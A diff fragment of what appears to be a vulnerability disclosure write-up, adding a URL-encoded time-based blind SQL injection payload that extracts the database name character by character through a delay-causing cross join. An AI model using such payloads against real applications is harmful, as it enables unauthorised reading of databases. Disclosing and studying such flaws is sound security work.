@@ -23,7 +23,9 @@ And if we change 116 to 115 there's no delay, there's no delay, there's SQL inje
 ![WPS图片(3)](https://github.com/nagenanhai/cve/assets/42707759/d483722b-22ad-4d88-a7b6-af4321adbd52)
 
 The second part of the database is intercepted by blind injection, and the second part is identified as the letter d by the delay time
-
+```
+1)%20and%20(substr(DATABASE(),2,1))=char(100)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
+```
 ![WPS图片(4)](https://github.com/nagenanhai/cve/assets/42707759/c8f3a9d6-6624-4b5c-acf0-05ab8842580e)
 
 
